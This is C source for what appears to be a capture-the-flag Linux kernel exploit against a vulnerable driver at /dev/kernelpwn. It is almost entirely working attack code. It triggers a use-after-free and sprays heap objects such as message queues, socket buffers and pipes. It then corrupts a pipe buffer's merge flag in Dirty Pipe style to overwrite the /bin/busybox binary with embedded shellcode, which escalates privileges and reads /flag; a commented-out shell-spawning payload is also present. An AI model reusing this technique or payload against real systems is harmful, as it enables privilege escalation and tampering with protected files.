#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/fs.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/msg.h>
#include <unistd.h>
#include <sys/socket.h>


#define BUFF_SIZE 0x400
#define ATTACK_FILE "/bin/busybox"
#define NUM_PIPES 0x30
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 0x20
#define SKB_SHARED_INFO_SIZE 0x140
#define PIPE_BUFFER_SIZE 0x280

void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
      printf("%02X ", ((unsigned char*)data)[i]);
      if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
          ascii[i % 16] = ((unsigned char*)data)[i];
      } else {
          ascii[i % 16] = '.';
      }
      if ((i+1) % 8 == 0 || i+1 == size) {
        printf(" ");
        if ((i+1) % 16 == 0) {
            printf("|  %s \n", ascii);
        } else if (i+1 == size) {
            ascii[(i+1) % 16] = '\0';
            if ((i+1) % 16 <= 8) {
                printf(" ");
            }
            for (j = (i+1) % 16; j < 16; ++j) {
                printf("   ");
            }
            printf("|  %s \n", ascii);
        }
      }
    }
}

int pipes[NUM_PIPES][2];

/*
 >>> from pwn import *
 >>> tmp_elf = asm(shellcraft.amd64.linux.cat("/flag"),arch='amd64')
 >>> filename = make_elf(tmp_elf,extract=False,arch='amd64')
 >>> filename
 '/tmp/pwn-asm-njsokfo8/step3-elf'
 
 $ as orw.asm -o orw.o --64
 $ ld -melf_x86_64  -o orw orw.o --omagic
 $ xxd -i orw

 */

const char attack_data[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x48, 0xB8, 
    0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
    0x50, 0x48, 0xB8, 0x2E, 0x67, 0x6D, 0x60, 0x66, 
    0x01, 0x01, 0x01, 0x48, 0x31, 0x04, 0x24, 0x6A, 
    0x02, 0x58, 0x48, 0x89, 0xE7, 0x31, 0xF6, 0x0F, 
    0x05, 0x41, 0xBA, 0xFF, 0xFF, 0xFF, 0x7F, 0x48, 
    0x89, 0xC6, 0x6A, 0x28, 0x58, 0x6A, 0x01, 0x5F, 
    0x99, 0x0F, 0x05}; 
    
    /*0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};*/


int fd;

struct Arg{
  size_t size;
  void* buf;
};


void kern_add(void * buf){
  struct Arg arg;
    
  arg.size = 1024;
  arg.buf = buf;
  ioctl(fd,32,&arg);
}

void kern_free(int idx){
  ioctl(fd,48,&idx);
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        perror("[-] write");
        return -1;
      }
    }
  }
  return 0;
}


void spray_msg(int num,int size){
  struct {
    long mtype;
    char mtext[size-48];
  }msg;
  memset(msg.mtext, 0x42, BUFF_SIZE-1); 
  msg.mtext[size-48] = 0;
  int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
  msg.mtype = 1; 
  for(int i = 0; i < num ; i++)
    msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}

int main(){
  int s;
  int ss[NUM_SOCKETS][2];
  int attack_fd = open(ATTACK_FILE, O_RDONLY);
  if (attack_fd < 0) {
    perror("open target failed");
  }
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("[-] socket");
  }
  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      perror("[-] socketpair");
    }
  }
  fd = open("/dev/kernelpwn",O_RDWR);

  char * buf = calloc(1,BUFF_SIZE);
  spray_msg(10,0x400);
  kern_add(buf);
  kern_free(0);
  puts("spray skbuff...");
  memset(buf,0x41,BUFF_SIZE);
  spray_skbuff(ss,buf,BUFF_SIZE-SKB_SHARED_INFO_SIZE);
  puts("free ...");
  kern_free(0);

  for(int i=0;i<NUM_PIPES;i++){
    if (pipe(pipes[i])) {
      perror("Alloc pipe failed");
    }
    const unsigned pipe_size = fcntl(pipes[i][1], F_GETPIPE_SZ);
    static char tmp_buff[4096];
    //memset(tmp_buff,0x42+i,4096);
    for (unsigned r = pipe_size; r > 0;) {
      unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
      write(pipes[i][1], tmp_buff, n);
             r -= n;
    }
    for (unsigned r = pipe_size; r > 0;) {
      unsigned n = r > sizeof(tmp_buff) ? sizeof(tmp_buff) : r;
      read(pipes[i][0], tmp_buff, n);
      r -= n;
    }
    write(pipes[i][1], buf, 0x100+i);
    loff_t offset = 1;
    ssize_t nbytes = splice(attack_fd, &offset, pipes[i][1], NULL, 1, 0);
    if (nbytes < 0) {
      perror("splice() failed");
    }
  }
  int uaf_pipe_idx = 0;
  char pipe_buffer_backup[0x280];
  int PIPE_BUF_FLAG_CAN_MERGE = 0x10;
        
  void *ptr = buf;
  uint64_t size = BUFF_SIZE - SKB_SHARED_INFO_SIZE;
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], ptr, size) < 0) {
        perror("read from sock pairs failed");
        }
      uint32_t test_size = ((uint32_t *)ptr)[3];
      if ((test_size >= 0x100) && (test_size < 0x100 + NUM_PIPES)) {
        uaf_pipe_idx = test_size - 0x100;
        printf("uaf_pipe_idx: %d\n", uaf_pipe_idx);
        memcpy(pipe_buffer_backup, ptr, 0x280);
      }
    }
  }


  //DumpHex(pipe_buffer_backup, PIPE_BUFFER_SIZE);
  
  memset(buf, 0, BUFF_SIZE);
  memcpy(buf, pipe_buffer_backup, PIPE_BUFFER_SIZE);
  ((uint64_t *)buf)[6] = 0;                       // offset | len
  ((uint64_t *)buf)[8] = PIPE_BUF_FLAG_CAN_MERGE; // flag
  spray_skbuff(ss,buf, BUFF_SIZE - SKB_SHARED_INFO_SIZE);
  ssize_t nbytes = write(pipes[uaf_pipe_idx][1], attack_data, sizeof(attack_data));
  if (nbytes < 0) {
      perror("write failed");
  }
  if ((size_t)nbytes < sizeof(attack_data)) {
      perror("short write");
  }

  read(attack_fd,buf,BUFF_SIZE);
  DumpHex(buf,BUFF_SIZE);
  close(pipes[uaf_pipe_idx][0]);
  close(pipes[uaf_pipe_idx][1]);

  execl(ATTACK_FILE, ATTACK_FILE, NULL);
  //break point
  //kern_free(0);
  
  return 0;
}
